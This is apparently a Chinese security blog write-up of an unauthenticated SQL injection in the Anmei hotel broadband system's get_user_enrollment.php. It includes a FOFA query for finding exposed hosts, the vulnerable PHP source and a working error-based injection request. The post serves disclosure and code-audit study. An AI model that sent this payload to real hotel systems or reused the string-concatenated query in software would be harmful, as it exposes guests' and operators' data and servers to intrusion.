---
title: "安美数字酒店宽带运营系统 get_user_enrollment.php SQL注入漏洞"
source: https://mrxn.net/jswz/amttgroup-get_user_enrollment-userid-sqli.html
asset_dir: assets/安美数字酒店宽带运营系统-get_user_enrollment.php-sql注入漏洞
---

# 安美数字酒店宽带运营系统 get\_user\_enrollment.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/4 18:37
- 707浏览
- [0评论](#comment)
- 26分钟阅读

深入探索

安全

授权

漏洞扫描服务

---

# 漏洞简介

安美数字酒店宽带运营系统的 get\_user\_enrollment.php 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中的信息之外，甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# fofa语法

> `body="http://www.amttgroup.com/" && body="form.ManagerID.focus()"`

# 漏洞分析

user/portal/get\_user\_enrollment.php 和 user/get\_user\_enrollment.php 代码一致，分析其中之一就行

user/get\_user\_enrollment.php 业务逻辑如下

```
<?
        include_once ("mysql.php");
        /*
        //getUserEnrollment(0) 表示查找不到Enrollment记录
        //                                                (认证页面不做跳转动作)
        //
        //getUserEnrollment(1) 表示找到Enrollment记录，但Mac记录不存在
        //                                                (认证页面做跳转动作)
        */

        function return_res($state)
        {
                return "getUserEnrollment(".$state.")";
        }

        if (!isset($userid)) $userid = "";
        if (!isset($usermac)) $usermac = "";
        if (!isset($portaltype)) $portaltype = "";
        if (!isset($portalname)) $portalname = "";

        if (trim($userid) == ""  || trim($usermac) == "") {
                echo return_res(0);
                exit;
        }

        $db = new newDB();

        $sqlcmd = "SELECT EnrollmentID from T_MacLog where ExpireTime>'".time(0)."' and AccountID='$userid' and CheckOutFlag='0' and UserMac='$usermac'";
        $result = $db->query($sqlcmd, '0');
        if  ($result && $db->num_rows($result) > 0) {
                echo return_res(0);
                $db->close();
                exit;
        }

        $sqlcmd = "SELECT EnrollmentID from T_Enrollment where AccountID='$userid' and CheckOutFlag='0' and PortalMode='1' and ExpireTime>'".time(0)."' ";
        if (strtolower($portaltype) == "public" && strtolower($portalname) == "wlan") {
                //无线
                $sqlcmd .= "and (AllowEnetMacNum='0' or (AllowWlanMacNum>'0' and RegWlanMacNum<AllowWlanMacNum))";
        } else {
                //有线
                $sqlcmd .= "and (AllowEnetMacNum='0' or (AllowEnetMacNum>'0' and RegEnetMacNum<AllowEnetMacNum))";
        }
        $result = $db->query($sqlcmd, '0');
        if  ($result && $db->num_rows($result) > 0) {
                echo return_res(1);
        }else{
                echo return_res(0);
        }

        $db->close();
        exit;
?>
```

`$userid` 和 `$usermac` 二者均没有任何过滤校验操作，直接拼接进SQL语句中执行，造成SQL注入。

代码安全审计

只需要满足 二者不为空即可进入SQL语句查询处理处。

# 漏洞复现

```
GET /user/get_user_enrollment.php?userid=1'+and+extractvalue(1,concat(0x7e,user(),0x7e,database()))--+-&usermac=2 HTTP/1.1
Host: amttgroup.mrxn.net
```

[![安美数字酒店宽带运营系统 get_user_enrollment.php SQL注入漏洞](images/img-001-a7b80fdc2ce0.webp)](https://image.mrxn.net/1eb591aa44a940b39d54a6c70e32e23d.webp)

成功利用报错注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取到数据库用户+数据库名信息。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
